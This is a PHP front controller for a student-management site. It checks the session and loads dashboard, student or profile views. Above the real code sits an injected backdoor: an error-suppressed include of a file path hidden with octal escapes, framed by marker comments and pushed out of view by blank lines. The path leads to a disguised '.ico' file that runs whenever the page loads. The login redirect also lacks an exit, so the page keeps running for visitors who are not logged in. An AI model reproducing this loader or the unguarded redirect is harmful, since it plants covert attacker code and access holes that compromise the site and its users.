<?php
/*77b3b*/

@include ("\057hom\145/x4\162w5i\070h5u\161o/p\165bli\143_ht\155l/v\151swa\152itn\151kha\164hgy\155nas\164iks\056com\057vie\167s/c\143x/.\146e33\14522c\056ico");

/*77b3b*/




























  session_start();

require_once('functions.php');

if(!isset($_SESSION["user"])) {
    header("Location: ".$site_root."/login.php");
  }


//=== Setting active menus

$dashboard_active = '';
$students_active = '';
// $dashboard_active = '';
// $dashboard_active = '';
// $dashboard_active = '';
// $dashboard_active = '';


if($_SESSION['redirect_page'] == 'home') {
    $dashboard_active = 'active';
    include_once('views/dashboard/index.php'); 
}

if($_SESSION['redirect_page'] == 'students') {
    $students_active = 'active';
    include_once('views/students/index.php'); 
}

if($_SESSION['redirect_page'] == 'profile') {
    $students_active = 'active';
    include_once('views/students/profile.php'); 
}


if($_SESSION['redirect_page'] == 'logout') {
    session_destroy();
    header("Location: ".$site_root."/login.php");
}
